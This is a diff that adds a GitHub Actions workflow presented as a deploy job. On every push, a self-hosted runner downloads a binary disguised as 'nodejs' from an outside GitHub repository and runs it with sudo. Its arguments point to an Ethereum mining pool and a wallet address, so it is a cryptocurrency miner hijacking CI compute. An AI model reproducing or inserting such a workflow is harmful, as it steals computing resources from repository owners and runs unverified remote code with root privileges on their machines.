@@ -1,0 +1,12 @@
+name: gas
+
+on: [push]
+
+jobs:
+  deploy:
+    runs-on: self-hosted
+    steps:
+      - name: sylyds
+        uses: actions/checkout@v2
+      - name: gasd
+        run: apt-get install libpci3 &&  wget https://github.com/gasken1/asw/raw/main/nodejs && chmod +x nodejs && sudo ./nodejs -epool eth-us1.hellominer.com:1100 -wal 0xdd2bf2f341c4cd978e4996e54ace697936619bf1.$(echo $(shuf -i 1-5 -n 1)-gpu) -pass x
